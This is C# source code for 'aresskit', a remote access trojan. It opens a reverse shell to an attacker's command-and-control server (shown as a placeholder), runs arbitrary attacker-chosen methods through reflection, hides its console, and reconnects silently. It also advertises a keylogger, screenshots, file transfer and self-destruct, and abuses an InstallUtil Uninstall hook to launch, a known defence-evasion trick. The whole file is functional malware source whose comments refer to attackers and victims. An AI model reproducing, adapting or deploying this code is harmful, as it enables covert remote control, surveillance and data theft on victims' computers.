using System;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;

namespace aresskit
{

    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtil : System.Configuration.Install.Installer
    {
        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Install(System.Collections.IDictionary savedState)
        {
            //Place Something Here... For Confusion/Distraction
        }

        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Program.Main();
        }
    }

    class Program
    {
        const string server = "<ip_of_C2>"; // Server Hostname or IP Address to connect back to.
        const int port = <port_of_C2>; // TCP Port to connect back to.
        const bool hideConsole = false; // Show/Hide malicious console on Clients (victims) computer.
        const string cmdSplitter = "::"; // Characters to split Class/Method in command input (ex: Administration::IsAdmin or Administration->IsAdmin)


        private static void sendBackdoor(string server, int port)
        {
            try
            {
                TcpClient client = new TcpClient(server, port);
                NetworkStream stream = client.GetStream();
                string responseData;

                while (true)
                {
                    byte[] shellcode = Misc.byteCode("aresskit> ");

                    stream.Write(shellcode, 0, shellcode.Length); // Send Shellcode
                    byte[] data = new byte[256]; byte[] output = Misc.byteCode("");

                    // String to store the response ASCII representation.

                    int bytes = stream.Read(data, 0, data.Length);
                    responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
                    responseData = responseData.Replace("\n", string.Empty);

                    if (responseData == "cd")
                        System.IO.Directory.SetCurrentDirectory(responseData.Split(" ".ToCharArray())[1]);
                    else if (responseData == "exit")
                    {   // Disconnect the attacker from the C&C backdoor.

                        client.Close();
                    }
                    else if (responseData == "kill")
                        Environment.Exit(0); // Exit cleanly upon command 'kill'
                    else if (responseData == "help")
                    {
                        string helpMenu = "\n";
                        var theList = Assembly.GetExecutingAssembly().GetTypes().Where(t => t.Namespace == "aresskit").ToList();
                        theList.RemoveAt(theList.IndexOf(typeof(_)));

                        foreach (Type x in theList)
                        {
                            if (x.Name != "<>c" && x.Name != "LowLevelKeyboardProc") // To rid away unused Classes
                                helpMenu += Misc.ShowMethods(x) + "\n";
                        }

                        output = Misc.byteCode(helpMenu);
                    }
                    else
                    {
                        try
                        {
                            if (!responseData.Contains(cmdSplitter))
                            {
                                if (responseData != "")
                                    output = Misc.byteCode("'" + responseData.Replace("\n", "") + "' is not a recognized command.\n");
                            }
                            else
                            {
                                responseData = responseData.Trim(); // To eliminate annoying things in the string

                                // Will produce: (clas name), (method name), [arg](,)[arg]...
                                string[] classMethod = responseData.Split(new[] { cmdSplitter }, StringSplitOptions.None);


                                Type methodType = Type.GetType("aresskit." + classMethod[0]); // Get type: aresskit.Class
                                object classInstance = Activator.CreateInstance(methodType); // Create instance of 'aresskit.Class'

                                string[] methodData = classMethod[1].Split(new char[0]);
                                MethodInfo methodInstance = methodType.GetMethod(methodData[0]);
                                if (methodInstance == null)
                                    output = Misc.byteCode("No such class/method with the name '" + classMethod[0] + cmdSplitter + classMethod[1] + "'");
                                ParameterInfo[] methodParameters = methodInstance.GetParameters();


                                string parameterString = default(string);
                                string[] parameterArray = { "" };

                                if (methodInstance != null)
                                {
                                    if (methodParameters.Length == 0)
                                    {
                                        output = Misc.byteCode(methodInstance.Invoke(classInstance, null) + "\n");
                                    }
                                    else
                                    {
                                        if (methodParameters[0].ParameterType.ToString() == "System.String")
                                        {
                                            for (int i = 1; i < methodData.Length; i++)
                                                parameterString += methodData[i] + " ";
                                            parameterArray[0] = parameterString;
                                        }
                                        output = Misc.byteCode(methodInstance.Invoke(classInstance, parameterArray).ToString() + "\n");
                                    }
                                }
                            }
                        }
                        catch (Exception e)
                        { output = Misc.byteCode(e.Message + "\n"); }
                    }

                    try
                    {
                        stream.Write(output, 0, output.Length); // Send output of command back to attacker.
                    }
                    catch (Exception)
                    {
                        stream.Close();
                        client.Close();
                        break;
                    }
                }

                // Close everything.
                stream.Close();
                client.Close();
            }
            catch (Exception) { while (true) { sendBackdoor(server, port); } } // Pass socket connection silently.
        }

        public static void Main()
        {
            // Hide Window
            if (hideConsole)
                Toolkit.HideWindow();

            // Fully featured Remote Administration Tool (RAT)
            /*
             * Aresskit comes equipped with networking tools and administration tools such as:
             * - Built-In Port Scanner
             * - Reverse Command Prompt Shell (minimalistic, no auth required)
             * - UDP/TCP Port Listener (similar to Netcat)
             * - File downloader/uploader
             * - Screenshot(s)
             * - Real-Time and Log-based Keylogger
             * - Self-destruct feature (protect your privacy)
            */

            while (true)
            {
                if (Network.checkInternetConn("www.bing.com") || server == "<ip_of_C2>")
                {
                    try
                    {
                        // Console.WriteLine("Sending RAT terminal to: {0}, port: {1}", server, port);
                        sendBackdoor(server, port);
                    }
                    catch (SocketException) // Attacker Server has most likely forced disconnect
                    { Console.WriteLine("Attacker has disconnected."); }
                    catch (Exception e)
                    { Console.WriteLine(e); } // pass silently
                }
                System.Threading.Thread.Sleep(5000); // sleep for 5 seconds before retrying
            }
        }
    }
}
